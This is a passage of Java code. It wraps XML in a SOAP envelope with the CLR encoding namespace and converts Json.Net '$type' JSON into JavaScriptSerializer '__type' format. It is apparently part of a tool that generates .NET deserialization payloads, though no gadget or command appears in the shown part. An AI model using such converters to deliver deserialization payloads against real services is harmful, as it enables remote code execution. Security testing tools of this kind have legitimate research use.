            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" + xml + "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return soap.getBytes(StandardCharsets.UTF_8);
    }

    /** Convert Json.Net ($type) JSON to JavaScriptSerializer (__type) format. */
    private static byte[] jsonNetToJavaScriptSerializer(byte[] jsonPayload) {
        String json = new String(jsonPayload, StandardCharsets.UTF_8);
        json = json.replace("\"$type\":", "\"__type\":");
        json = json.replace("\"$value\":", "\"value\":");
        json = json.replace("\"$values\":", "\"values\":");
        return json.getBytes(StandardCharsets.UTF_8);
    }
}
